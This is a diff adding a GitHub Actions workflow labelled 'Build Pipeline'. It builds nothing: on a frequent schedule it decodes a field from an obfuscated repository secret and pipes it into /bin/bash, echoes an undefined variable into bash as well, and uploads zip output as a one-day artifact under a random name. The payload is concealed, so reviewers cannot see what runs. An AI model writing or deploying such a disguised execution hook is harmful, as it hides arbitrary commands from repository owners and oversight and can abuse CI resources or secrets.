@@ -1,0 +1,29 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '21 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          axfgu526: ${{ secrets.axfgu526 }}
+        run: |
+          printf '%s' "$axfgu526" | jq -r .iqawv489 | /bin/bash
+          echo $pjg64 | jq -r .bviff48125 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: id9ZzQxu
+          path: "*.zip"
+          retention-days: 1
